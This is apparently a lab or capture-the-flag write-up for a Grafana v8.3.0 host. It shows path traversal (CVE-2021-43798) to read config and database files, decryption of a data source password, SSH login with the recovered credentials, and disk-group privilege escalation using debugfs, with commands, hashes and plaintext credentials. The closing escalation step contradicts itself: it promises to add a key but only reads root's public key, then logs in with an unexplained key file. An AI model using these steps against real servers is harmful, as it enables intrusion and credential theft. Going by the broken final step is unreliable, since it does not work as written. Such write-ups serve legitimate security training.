# IP : 192.168.234.181

## OS/TECHNO
- Ubuntu, PHP stack in front of Grafana v8.3.0 (914fcedb72) and Prometheus

## USER
- `sysadmin : SuperSecureP@ssw0rd`

## PASSWORD
- (Recovered from Grafana data source decryption — see Exploitation)

## SERVICE
- **80/HTTP** → (front for apps; not used directly)
- **3000/HTTP** → **Grafana v8.3.0**
- **9090/HTTP** → **Prometheus**
- **22/SSH**

## NMAP
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Exploitation
### Grafana **directory traversal** (CVE-2021-43798)
- Grafana v8.3.0 is vulnerable to plugin path traversal, allowing read access to local files.
- Use a vulnerable plugin path, then traverse to read:
  - `/etc/grafana/grafana.ini` → obtain **[security] secret_key** (often default `SW2YcwTIb9zpOOhoPsMm` if unset).
  - `/var/lib/grafana/grafana.db` → SQLite DB with users and data sources.

### User table (for reference)
From the `user` table (columns include `login,email,password,salt,...`) you’ll see an **old salted SHA-256** hash for `admin`:
- `login: admin`
- `email: admin@localhost`
- `password (sha256)`: `63f57627...bd65aa80` (64 hex chars)
- `salt`: `Vq2cDMrPtzt192oddkH`

> Cracking is optional; instead, decrypt a data source secret to get a live credential.

### Decrypt **data source** secret (AES‑256‑CFB)
- Read `data_source.secure_json_data` / `basic_auth_password` (base64) from the DB.
- With the **secret_key** from `grafana.ini`, decrypt the base64 using a public tool:
  - Example tool: `Sic4rio/Grafana-Decryptor-for-CVE-2021-43798`
- Result recovered in this case:
  - `grafanaIni_secretKey = SW2YcwTIb9zpOOhoPsMm`
  - `DataSourcePassword (base64) = anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==`
  - **Plaintext = `SuperSecureP@ssw0rd`**

###  SSH
- Creds: **`sysadmin : SuperSecureP@ssw0rd`**
- Connect:
  ```bash
  ssh sysadmin@192.168.234.181
  ```
- Shell:
  ```
  uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
  ```

---

## Privilege Escalation
`sysadmin` is in group **disk** → raw access to block devices (read/write). This permits editing files on `/` via the underlying device.

### Option A — Add your SSH key to root (clean & fast)
1) Identify root FS device:
```bash
lsblk
# root mounted on /dev/sda2  
```
2) read public key using `debugfs`:
```bash

debugfs -R 'cat /root/.ssh/id_rsa.pub'  /dev/sda2
```

3) Log in as root:
```bash
ssh -i key root@192.168.234.181
```
